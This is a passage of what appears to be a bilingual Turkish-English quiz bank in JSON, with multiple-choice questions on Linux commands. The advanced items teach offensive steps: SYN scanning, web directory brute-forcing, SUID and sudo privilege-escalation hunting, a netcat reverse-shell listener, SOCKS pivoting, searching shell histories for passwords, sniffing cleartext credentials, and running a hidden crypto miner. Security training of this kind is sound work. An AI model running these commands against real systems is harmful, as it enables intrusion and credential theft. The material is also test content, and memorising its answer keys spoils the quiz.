      "topic": "permissions",
      "code": "umask 022\ntouch test.txt\nls -l test.txt | cut -c2-10",
      "options": [
        "rw-r--r--",
        "rwxrwxrwx",
        "rw-rw-rw-",
        "rwxr-xr-x"
      ],
      "answer": 0,
      "explanation": {
        "tr": "Standart dosya taban izinleri 666'dır (rw-rw-rw-). umask 022 bu tabandan 022 çıkarır: 666 - 022 = 644 (rw-r--r--). Dosyalar varsayılan olarak çalıştırma (x) yetkisi almaz.",
        "en": "Default file permissions base is 666. Subtracting umask 022 gives 644 (rw-r--r--). Standard files do not receive execute bits by default."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "sha256sum /bin/ls | awk '{print length($1)}'",
      "options": [
        "64",
        "32",
        "128",
        "16"
      ],
      "answer": 0,
      "explanation": {
        "tr": "SHA-256 özeti 256 bit uzunluğundadır ve onaltılık (hex) tabanda 64 karakter uzunluğunda bir dize üretir. MD5 32 karakterdir.",
        "en": "SHA-256 produces a 256-bit digest represented by 64 hexadecimal characters. MD5 is 32 chars."
      }
    },
    {
      "topic": "basics",
      "code": "tar -czvf payload.tar.gz /tmp/tools",
      "options": [
        {
          "tr": "/tmp/tools dizinini gzip ile sıkıştırılmış payload.tar.gz arşivine dönüştürür",
          "en": "Creates a gzip-compressed archive payload.tar.gz of /tmp/tools"
        },
        {
          "tr": "payload.tar.gz dosyasını açar",
          "en": "Extracts payload.tar.gz"
        },
        {
          "tr": "Dizini şifreler",
          "en": "Encrypts directory"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-c (create), -z (gzip sıkıştırma), -v (verbose/ayrıntılı), -f (arşiv dosya adı). Arşiv açmak için -c yerine -x (extract) kullanılır.",
        "en": "-c creates, -z applies gzip compression, -v is verbose, and -f specifies the archive name. Extraction uses -x."
      }
    },
    {
      "topic": "piping",
      "code": "sed 's/admin/superadmin/g' config.txt",
      "options": [
        {
          "tr": "Dosyadaki tüm 'admin' kelimelerini 'superadmin' olarak değiştirip ekrana basar",
          "en": "Replaces all occurrences of 'admin' with 'superadmin' and prints to stdout"
        },
        {
          "tr": "Dosyayı doğrudan siler",
          "en": "Deletes file directly"
        },
        {
          "tr": "admin kelimesini dosyadan çıkarır",
          "en": "Removes admin from file"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "sed 's/aranan/yeni/g' bir akış düzenleyicisidir (stream editor). 's' substitute (değiştir), 'g' global (satırdaki tüm eşleşmeler). -i parametresi verilmedikçe orijinal dosyayı değiştirmez, çıktıyı ekrana basar.",
        "en": "sed 's/pattern/replacement/g' performs global regex replacement across input streams without altering file unless -i is used."
      }
    },
    {
      "topic": "networking",
      "code": "ip route | grep default | awk '{print $3}'",
      "options": [
        {
          "tr": "Varsayılan ağ geçidi (Default Gateway) IP adresini verir",
          "en": "Extracts Default Gateway IP address"
        },
        {
          "tr": "DNS sunucu IP adresini verir",
          "en": "Outputs DNS server IP"
        },
        {
          "tr": "Hedefin MAC adresini verir",
          "en": "Outputs target MAC address"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "'ip route' çıktısındaki 'default via 192.168.1.1 dev eth0' satırında 3. alan ağ geçididir (gateway). Ağda ortadaki adam (MITM) veya ARP spoofing öncesi hedef gateway IP'sini öğrenmek için kullanılır.",
        "en": "In 'ip route', 'default via <IP>' specifies the local gateway in field 3, essential knowledge before conducting network attacks."
      }
    },
    {
      "topic": "basics",
      "code": "df -h / | tail -n 1 | awk '{print $5}'",
      "options": [
        {
          "tr": "Kök (/) disk bölümünün doluluk yüzdesini (ör. 42%) verir",
          "en": "Returns the percentage disk space used on root partition (e.g. 42%)"
        },
        {
          "tr": "Toplam RAM miktarını verir",
          "en": "Outputs total RAM size"
        },
        {
          "tr": "Kullanıcı sayısını verir",
          "en": "Outputs logged-in user count"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "df -h disk alanı kullanımını okunabilir (GB/MB) formatta sunar. 5. sütun 'Use%' yani kullanım yüzdesidir.",
        "en": "df -h reports disk usage. Column 5 corresponds to 'Use%', indicating disk utilization percentage."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "cmd_not_found_xyz 2> /dev/null\necho $?",
      "options": [
        {
          "tr": "127",
          "en": "127"
        },
        {
          "tr": "0",
          "en": "0"
        },
        {
          "tr": "Hata mesajı ekrana basılır",
          "en": "Error message printed"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "2> /dev/null standart hata (stderr) çıktısını karadeliğe yönlendirir, bu yüzden hata mesajı ekranda görünmez. Linux kabuklarında 'komut bulunamadı' (command not found) hatasının durum kodu 127'dir.",
        "en": "Redirecting stderr (2>) silences error messages. Bash assigns exit code 127 specifically for 'command not found'."
      }
    },
    {
      "topic": "process",
      "code": "pgrep -u root sshd",
      "options": [
        {
          "tr": "root kullanıcısı tarafından çalıştırılan sshd servisinin PID numaralarını listeler",
          "en": "Lists PID numbers of sshd processes owned by root"
        },
        {
          "tr": "root kullanıcısının SSH erişimini kapatır",
          "en": "Disables root SSH access"
        },
        {
          "tr": "Yeni bir SSH tüneli açar",
          "en": "Opens a new SSH tunnel"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "pgrep, süreçleri filtreleyerek sadece PID'lerini döndürür. -u root parametresi sadece root'a ait olan sshd işlemlerini süzerek getirir.",
        "en": "pgrep searches active processes and prints PIDs matching criteria. -u restricts by user."
      }
    },
    {
      "topic": "forensics",
      "code": "strings /bin/login | grep -i \"pam\"",
      "options": [
        {
          "tr": "İkili dosya (binary) içindeki okunabilir metinlerden 'pam' geçenleri ayıklar",
          "en": "Extracts human-readable strings from the binary containing 'pam'"
        },
        {
          "tr": "Login programını derler",
          "en": "Compiles login binary"
        },
        {
          "tr": "Kullanıcı şifrelerini deşifre eder",
          "en": "Decodes passwords"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "'strings' komutu ELF veya ikili dosyalar içindeki en az 4 karakterlik yazdırılabilir ASCII/Unicode karakter dizilerini çıkarır. Tersine mühendislik ve zararlı yazılım analizinde gömülü URL, IP veya fonksiyon adlarını bulmak için kullanılır.",
        "en": "'strings' extracts printable character sequences from binary files, a cornerstone tool in malware analysis to discover hardcoded strings."
      }
    },
    {
      "topic": "basics",
      "code": "find /var/log -type f -name \"*.log\" | wc -l",
      "options": [
        {
          "tr": "/var/log dizininde sonu .log ile biten normal dosyaların sayısını verir",
          "en": "Returns the count of regular files ending with .log in /var/log"
        },
        {
          "tr": "Tüm log dosyalarını siler",
          "en": "Deletes all log files"
        },
        {
          "tr": "Logların toplam boyutunu bayt cinsinden hesaplar",
          "en": "Calculates total size in bytes"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "find komutu dosya sisteminde arama yapar. -type f sadece normal dosyaları seçer, -name '*.log' dosya adını filtreler. wc -l ise bulunan dosya sayısını verir.",
        "en": "find searches the filesystem. -type f restricts to regular files matching '*.log', piped to wc -l to count matches."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "for i in {1..3}; do echo -n $i; done",
      "options": [
        "123",
        "1 2 3",
        "3",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "echo komutuna verilen -n parametresi satır sonuna yeni satır (newline) karakteri eklenmesini engeller. Bu yüzden 1, 2 ve 3 yan yana bitişik yazılarak '123' çıktısı verir.",
        "en": "echo -n suppresses trailing newlines, printing the loop outputs concatenated as '123'."
      }
    },
    {
      "topic": "process",
      "code": "lsof -i :80",
      "options": [
        {
          "tr": "80 numaralı portu kullanan açık dosya ve süreçleri (web sunucusu vb.) listeler",
          "en": "Lists open files and processes utilizing port 80 (e.g. web server)"
        },
        {
          "tr": "80 numaralı porttan web sitesi yayını başlatır",
          "en": "Starts broadcasting on port 80"
        },
        {
          "tr": "80 numaralı porta güvenlik duvarı kuralı ekler",
          "en": "Adds firewall rule for port 80"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "lsof (List Open Files) Linux'ta her şey bir dosyadır mantığıyla çalışır. -i :80 parametresi ağ soketlerinden 80. portu kullanan işlem adı ve PID'yi detaylıca gösterir.",
        "en": "lsof (List Open Files) with -i :80 inspects network sockets currently bound to port 80."
      }
    }
  ],
  "advanced": [
    {
      "topic": "security_recon",
      "code": "nmap -sS -p 22,80,443 -Pn 10.10.10.5",
      "options": [
        {
          "tr": "Ping atmadan (-Pn) hedefteki 22, 80 ve 443 portlarına gizli TCP SYN (Stealth) taraması yapar",
          "en": "Performs stealth TCP SYN scan against ports 22, 80, and 443 skipping ping discovery (-Pn)"
        },
        {
          "tr": "Hedefe tam TCP el sıkışmasıyla bağlanıp dosya indirir",
          "en": "Downloads files completing full TCP handshake"
        },
        {
          "tr": "Hedefin şifrelerini kırar",
          "en": "Cracks passwords on target"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-sS (SYN Stealth Scan), 3 yollu el sıkışmayı tamamlamaz (SYN gönderir, SYN-ACK alınca RST atar). Bu sayede hedef uygulama loglarında oturum açılmamış görünür. -Pn ise hedef ping isteklerini engellese bile taramayı zorlar.",
        "en": "-sS executes half-open SYN scans resetting upon SYN-ACK. -Pn treats host as online, bypassing ICMP ping blocking."
      }
    },
    {
      "topic": "security_recon",
      "code": "nmap -sV -sC -T4 10.10.10.20",
      "options": [
        {
          "tr": "Servis sürüm tespiti (-sV) yapar ve varsayılan NSE güvenlik script'lerini (-sC) çalıştırır",
          "en": "Performs service version detection (-sV) and executes default NSE security scripts (-sC)"
        },
        {
          "tr": "Sisteme sızıp ters kabuk alır",
          "en": "Exploits system and retrieves reverse shell"
        },
        {
          "tr": "Hedefin tüm diskini kopyalar",
          "en": "Clones target disk"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-sV (Version Detection) portlarda çalışan servislerin tam sürümlerini (ör. Apache 2.4.41) bulur. -sC varsayılan Nmap Scripting Engine (NSE) script'lerini çalıştırarak bilinen zaafiyetleri ve sertifikaları otomatik inceler. -T4 ise agresif hız profilidir.",
        "en": "-sV queries banners to fingerprint service versions, while -sC invokes default NSE security scripts for vulnerability identification."
      }
    },
    {
      "topic": "forensics",
      "code": "grep \"Failed password for\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -n 1",
      "options": [
        {
          "tr": "Sisteme en çok başarısız SSH parolası deneyen saldırgan IP adresini ve deneme sayısını verir",
          "en": "Outputs the top attacker IP address with the highest number of failed SSH attempts"
        },
        {
          "tr": "Başarılı giriş yapan kullanıcıları listeler",
          "en": "Lists successful user logins"
        },
        {
          "tr": "Tüm log dosyasını şifreler",
          "en": "Encrypts the entire log file"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "'Failed password for invalid user admin from 192.168.1.100 port 44444' satırında $(NF-3) sondan 4. alanı yani saldırgan IP'sini çeker. sort | uniq -c ile sayılır, sort -nr ile en çoktan aza sıralanıp ilk sıradaki brute-force kaynağı bulunur.",
        "en": "Extracts attacker IP from auth.log via $(NF-3), tallies via sort|uniq -c, and highlights the primary brute-force attacker via sort -nr|head."
      }
    },
    {
      "topic": "privesc",
      "code": "find / -perm -4000 -type f 2>/dev/null",
      "options": [
        {
          "tr": "Sistemde SUID biti atanmış olan tüm çalıştırılabilir ikili dosyaları arar",
          "en": "Finds all executable files with SUID bit set on the system"
        },
        {
          "tr": "Boyutu 4000 bayttan büyük dosyaları bulur",
          "en": "Finds files larger than 4000 bytes"
        },
        {
          "tr": "Sadece son 4000 dakikada değiştirilmiş dosyaları listeler",
          "en": "Lists files modified in last 4000 minutes"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-perm -4000 SUID (Set User ID) bayrağını arar. SUID biti olan bir dosya, onu çalıştıran kim olursa olsun dosya sahibinin (genelde root) yetkileriyle çalışır! GTFOBins kullanılarak yetki yükseltme (privilege escalation) için 1 numaralı hedef listesidir.",
        "en": "-perm -4000 detects SUID binaries running with owner (usually root) privileges. Prime vector for Linux privilege escalation."
      }
    },
    {
      "topic": "privesc",
      "code": "find / -writable -type d 2>/dev/null | grep -v \"/proc\\|/sys\"",
      "options": [
        {
          "tr": "Mevcut kullanıcının yazma yetkisi olan dizinleri (/tmp vb.) tespit eder",
          "en": "Detects all directories where current user has write permissions"
        },
        {
          "tr": "Tüm dosya sistemini salt okunur yapar",
          "en": "Makes filesystem read-only"
        },
        {
          "tr": "Silinmiş dizinleri kurtarır",
          "en": "Recovers deleted directories"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Saldırgan sisteme sızdığında kendi exploit'lerini ve zararlı payload'larını yüklemek için yazılabilir dizinlere (world-writable) ihtiyaç duyar. /tmp ve /dev/shm genelde yazılabilirdir.",
        "en": "-writable locates writable directories, crucial for drop locations to stage exploits and malicious scripts."
      }
    },
    {
      "topic": "security_recon",
      "code": "gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt",
      "options": [
        {
          "tr": "Hedef web sitesinde kelime listesi kullanarak gizli dizin ve dosyaları (.php, .txt) kaba kuvvetle arar",
          "en": "Brute-forces hidden web directories and files (.php, .txt) using wordlist"
        },
        {
          "tr": "Web sunucusundaki veritabanını çeker",
          "en": "Dumps database from web server"
        },
        {
          "tr": "Web sitesini klonlar",
          "en": "Mirrors website locally"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Gobuster, web sayfalarında robots.txt veya menülerde görünmeyen gizli yönetim panellerini (ör. /admin, /backup.txt) kelime listesiyle hızlıca bulmak için kullanılan siber güvenlik aracıdır. -x uzantıları ekler.",
        "en": "Gobuster brute-forces URIs on web servers to discover unlinked assets, config files, and hidden admin portals."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "nc -lvnp 4444",
      "options": [
        {
          "tr": "4444 numaralı portta gelen ters bağlantıları (reverse shell) yakalamak için netcat dinleyicisi başlatır",
          "en": "Spawns a netcat listener on port 4444 to catch inbound reverse shell connections"
        },
        {
          "tr": "4444 numaralı porta bağlanır",
          "en": "Connects outbound to port 4444"
        },
        {
          "tr": "4444 numaralı portu engeller",
          "en": "Blocks port 4444"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-l (listen / dinle), -v (verbose / ayrıntı), -n (numeric / DNS sorgusu yapma), -p (port). Kurban makineden tetiklenen ters kabuk bağlantısını yakalamak için saldırgan makinede bu komut çalıştırılır.",
        "en": "-l (listen), -v (verbose), -n (no DNS resolution), -p (port). Standard listener setup to capture incoming reverse shells."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "ssh -D 1080 -q -C -N -f user@pivot_host",
      "options": [
        {
          "tr": "pivot_host üzerinden yerel 1080 portunda dinamik bir SOCKS5 tüneli (proxy) açıp arka plana atar",
          "en": "Spawns a dynamic SOCKS5 proxy on local port 1080 tunneling through pivot_host in background"
        },
        {
          "tr": "Hedef makinenin tüm dosyalarını şifreler",
          "en": "Encrypts all files on host"
        },
        {
          "tr": "Kullanıcıyı oturumdan atar",
          "en": "Kills user session"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-D 1080 dinamik SOCKS proxy açar, -N komut çalıştırmaz (sadece port yönlendirme), -f arka planda çalıştırır, -C veri sıkıştırması yapar. Ağ içi pivot (pivoting) yaparak iç ağdaki diğer hedeflere proxychains ile erişmek için kullanılır.",
        "en": "-D creates a dynamic SOCKS5 proxy, and -N -f runs it headless in background. A classic pivoting pattern to traverse isolated subnets."
      }
    },
    {
      "topic": "forensics",
      "code": "find /home -name \".bash_history\" -exec cat {} + | grep -i \"password\"",
      "options": [
        {
          "tr": "Kullanıcıların komut geçmişi dosyalarında unutulmuş olabilecek açık şifreleri arar",
          "en": "Searches all user command histories for inadvertently recorded cleartext passwords"
        },
        {
          "tr": "Tüm şifreleri değiştirir",
          "en": "Changes all passwords"
        },
        {
          "tr": "Komut geçmişlerini kilitler",
          "en": "Locks bash history files"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Kullanıcılar terminalde 'mysql -u root -ppassword123' veya 'sudo' gibi komutlar çalıştırdığında şifreler .bash_history dosyasına düz metin kaydedilir. Pentestte yatay/dikey geçiş için altın madenidir.",
        "en": "Users frequently pass credentials inline, leaving cleartext secrets in .bash_history. A critical credential hunting step."
      }
    },
    {
      "topic": "privesc",
      "code": "sudo -l",
      "options": [
        {
          "tr": "Mevcut kullanıcının root yetkisiyle parola ile veya parolasız (NOPASSWD) çalıştırabileceği komutları listeler",
          "en": "Lists sudo permissions and commands current user can execute with root privileges"
        },
        {
          "tr": "Tüm sudo kullanıcılarını siler",
          "en": "Deletes all sudo users"
        },
        {
          "tr": "Sudo parolasını değiştirir",
          "en": "Changes sudo password"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "sudo -l, Linux yetki yükseltmede çalıştırılan en kritik komuttur. Eğer bir komut (ör. /usr/bin/vim, /usr/bin/find, /usr/bin/nmap) NOPASSWD olarak tanımlanmışsa sistem anında root edilebilir (GTFOBins).",
        "en": "sudo -l displays allowed privileges. If any executable runs with NOPASSWD, it can often be abused to spawn a root shell."
      }
    },
    {
      "topic": "networking",
      "code": "tcpdump -i eth0 -nn -A -c 1 'port 80'",
      "options": [
        {
          "tr": "eth0 arayüzünden geçen 80 numaralı port paketlerinden 1 tanesini ASCII metin olarak ekrana döker",
          "en": "Captures 1 packet on port 80 over eth0 displaying packet payload in ASCII text"
        },
        {
          "tr": "Tüm web trafiğini engeller",
          "en": "Blocks all HTTP traffic"
        },
        {
          "tr": "Ağ kartını kapatır",
          "en": "Disables network interface"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-i (arayüz), -nn (IP ve portları isim yerine sayı göster), -A (paketi ASCII metin olarak bas), -c 1 (1 paket sonra dur). HTTP trafiğindeki şifrelenmemiş form şifrelerini veya çerezleri (cookie) koklamak (sniffing) için kullanılır.",
        "en": "-A renders packet content in ASCII. Indispensable for sniffing unencrypted HTTP credentials or session cookies on the wire."
      }
    },
    {
      "topic": "forensics",
      "code": "lastb -n 5",
      "options": [
        {
          "tr": "Sisteme yapılan son 5 başarısız (Bad login) oturum açma girişimini listeler",
          "en": "Lists the last 5 failed login attempts recorded in /var/log/btmp"
        },
        {
          "tr": "Son 5 başarılı girişi gösterir",
          "en": "Displays last 5 successful logins"
        },
        {
          "tr": "Kullanıcıların son şifre değişikliklerini listeler",
          "en": "Shows last 5 password changes"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "'lastb' komutu /var/log/btmp ikili dosyasını okuyarak sisteme yapılan başarısız giriş denemelerini (IP, kullanıcı adı, tarih) gösterir. 'last' komutu ise başarılı girişleri (/var/log/wtmp) okur.",
        "en": "lastb parses /var/log/btmp to present failed authentication attempts, while 'last' reads /var/log/wtmp for successful sessions."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates",
      "options": [
        {
          "tr": "Hedef sunucunun SSL/TLS sertifikasının başlangıç ve bitiş geçerlilik tarihlerini çeker",
          "en": "Retrieves target server's SSL/TLS certificate validity start and expiration dates"
        },
        {
          "tr": "Hedefin SSL özel anahtarını çalar",
          "en": "Steals SSL private key"
        },
        {
          "tr": "Hedefin güvenlik sertifikasını siler",
          "en": "Deletes target certificate"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "openssl s_client hedefle doğrudan TLS el sıkışması yapar. Elde edilen x509 sertifikası 'openssl x509 -dates' komutuna aktarılarak sertifikanın ne zaman biteceği tespit edilir.",
        "en": "Initiates a raw TLS handshake and pipes the certificate to x509 parser to verify certificate issue and expiry dates."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "xargs -I {} nmap -p 80 {} < hosts.txt",
      "options": [
        {
          "tr": "hosts.txt içindeki her bir IP adresi için sırayla 'nmap -p 80 <IP>' komutunu çalıştırır",
          "en": "Executes 'nmap -p 80 <IP>' sequentially for every IP entry in hosts.txt"
        },
        {
          "tr": "hosts.txt dosyasını siler",
          "en": "Deletes hosts.txt"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws a syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "xargs standart girdiden gelen her satırı alır. -I {} parametresi {} yer tutucusunu gelen değerle değiştirir. Siber güvenlikte toplu hedef taramalarını otomatize etmek için çok sık kullanılır.",
        "en": "xargs takes input lines and substitutes {} with the incoming line, ideal for automating multi-target scans."
      }
    },
    {
      "topic": "permissions",
      "code": "chmod u+s /usr/bin/python3\nls -l /usr/bin/python3 | cut -c4",
      "options": [
        "s",
        "x",
        "r",
        "-"
      ],
      "answer": 0,
      "explanation": {
        "tr": "u+s komutu dosya sahibinin çalıştırma (x) yetkisine SUID biti ekler. İzin dizesinde 'x' harfi yerine 's' görünür (-rwsr-xr-x). Python'a SUID vermek, herhangi bir kullanıcının root kabuk alabilmesi demektir!",
        "en": "u+s applies SUID. The owner's execute permission 'x' becomes 's'. SUID on python allows instantaneous root escalation."
      }
    },
    {
      "topic": "process",
      "code": "nohup ./crypto_miner > /dev/null 2>&1 &",
      "options": [
        {
          "tr": "Komutu terminal kapatılsa bile çalışmaya devam edecek şekilde arka planda ve sessizce başlatır",
          "en": "Runs program in background detached from terminal hangup signals, suppressing all outputs"
        },
        {
          "tr": "Komutu root yetkisiyle başlatır",
          "en": "Starts program as root"
        },
        {
          "tr": "Komutu durdurur",
          "en": "Pauses program"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "nohup (No Hang Up), terminal oturumu kapandığında sürece SIGHUP sinyali gitmesini engeller. > /dev/null 2>&1 tüm çıktıları gizler, sondaki & ise süreci arka plana atar. Zararlı yazılımların kalıcılık yöntemi.",
        "en": "nohup ignores SIGHUP signals on terminal close. 2>&1 silences stdout/stderr, and & backgrounds the task."
      }
    },
    {
      "topic": "forensics",
      "code": "dmesg | grep -i \"segfault\"",
      "options": [
        {
          "tr": "Çekirdek (kernel) tamponunda meydana gelen bellek erişim ihlallerini (Segmentation Fault) gösterir",
          "en": "Filters kernel ring buffer for memory access violations (Segmentation Faults)"
        },
        {
          "tr": "Diskteki bozuk sektörleri onarır",
          "en": "Fixes bad disk sectors"
        },
        {
          "tr": "Ağ arayüzlerini sıfırlar",
          "en": "Resets network interfaces"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "dmesg çekirdek mesajlarını listeler. 'segfault' araması, buffer overflow (arabellek taşması) exploit denemelerini veya çöken programların bellek adreslerini adli bilişimde yakalamak için kullanılır.",
        "en": "dmesg reports kernel events. Segfault lines highlight crashed applications, vital during buffer overflow exploit investigations."
      }
    },
    {
      "topic": "security_recon",
      "code": "whatweb 10.10.10.15",
      "options": [
        {
          "tr": "Hedef web sitesinin CMS, web sunucusu, PHP sürümü ve kullanılan kütüphanelerini tanımlar (fingerprinting)",
          "en": "Identifies web technologies, CMS, server versions and embedded scripts (web fingerprinting)"
        },
        {
          "tr": "Web sitesini yayından kaldırır",
          "en": "Takes down target website"
        },
        {
          "tr": "Hedefin şifreli verilerini çözer",
          "en": "Decodes encrypted data"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "WhatWeb, web sitelerinin teknolojilerini (WordPress, jQuery, Apache, cPanel vb.) başlık ve HTML yapısından tespit eden bir web parmak izi çıkarma (fingerprinting) keşif aracıdır.",
        "en": "WhatWeb fingerprints websites to enumerate technologies, plugins, and embedded frameworks."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "set -e\ncmd_fail\necho \"Devam\"",
      "options": [
        {
          "tr": "Hata oluştuğu anda script anında sonlanır, 'Devam' yazdırılmaz",
          "en": "Script exits immediately upon failure; 'Devam' is never printed"
        },
        {
          "tr": "Devam",
          "en": "Devam"
        },
        {
          "tr": "cmd_fail komutunu görmezden gelir",
          "en": "Ignores cmd_fail"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "'set -e' (errexit), çalıştırılan herhangi bir komut başarısız (çıkış kodu > 0) olduğunda kabuk betiğinin anında çalışmayı durdurmasını sağlar. Güvenlik ve otomasyon script'lerinde kritik bir emniyet kilididir.",
        "en": "'set -e' instructs the shell to exit immediately if any command exits with a non-zero status."
      }
    },
    {
      "topic": "networking",
      "code": "dig +short example.com MX",
      "options": [
        {
          "tr": "example.com alan adının sadece posta (Mail Exchange) sunucu kayıtlarını listeler",
          "en": "Queries and outputs only Mail Exchange (MX) DNS records for example.com"
        },
        {
          "tr": "Web sunucusunun IP adresini değiştirir",
          "en": "Modifies web server IP"
        },
        {
          "tr": "Tüm DNS önbelleğini temizler",
          "en": "Flushes DNS cache"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "dig DNS sorguları yapar. +short parametresi gereksiz başlıkları ve yorumları gizleyerek sadece sonucu (MX kayıtları ve öncelik sayılarını) verir.",
        "en": "dig queries DNS. +short suppresses verbose header outputs, returning strictly the resolved MX records."
      }
    },
    {
      "topic": "forensics",
      "code": "find /etc -mmin -60 2>/dev/null",
      "options": [
        {
          "tr": "/etc dizininde son 60 dakika içinde içeriği değiştirilmiş olan dosyaları listeler",
          "en": "Lists files inside /etc modified within the last 60 minutes"
        },
        {
          "tr": "60 dakikadan eski dosyaları siler",
          "en": "Deletes files older than 60 minutes"
        },
        {
          "tr": "Tüm sistem saatini günceller",
          "en": "Syncs system clock"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-mmin -60 (modified minutes < 60), son 1 saatte değiştirilen dosyaları bulur. Bir siber olay müdahalesinde (incident response) saldırganın /etc/passwd veya /etc/shadow dosyasına ekleme yapıp yapmadığını anlamada hayatidir.",
        "en": "-mmin -60 detects files altered in the last hour, crucial in incident response to pinpoint recently tampered configuration files."
      }
    },
    {
      "topic": "privesc",
      "code": "crontab -l",
      "options": [
        {
          "tr": "Mevcut kullanıcının zamanlanmış görevlerini (cron jobs) listeler",
          "en": "Lists scheduled cron jobs for the current user"
        },
        {
          "tr": "Tüm zamanlanmış görevleri siler",
          "en": "Deletes all scheduled jobs"
        },
        {
          "tr": "Sistem saatini gösterir",
          "en": "Displays system time"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "crontab -l ile kullanıcının zamanlanmış otomatik script'leri görülür. Eğer root kullanıcısının zamanlanmış bir cron job'u yazılabilir bir dosyayı çalıştırıyorsa yetki yükseltme açığı oluşur.",
        "en": "crontab -l inspects scheduled user tasks. Insecure scripts run by cron under root present trivial privilege escalation vectors."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "ssh -o StrictHostKeyChecking=no -i key.pem root@10.10.10.5",
      "options": [
        {
          "tr": "Sunucunun host key parmak izini doğrulamadan sessizce kabul edip SSH oturumu açar",
          "en": "Establishes SSH session while automatically accepting host key fingerprint without prompting"
        },
        {
          "tr": "SSH bağlantısını reddeder",
          "en": "Rejects SSH connection"
        },
        {
          "tr": "Yeni bir SSH anahtarı üretir",
          "en": "Generates new SSH key"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
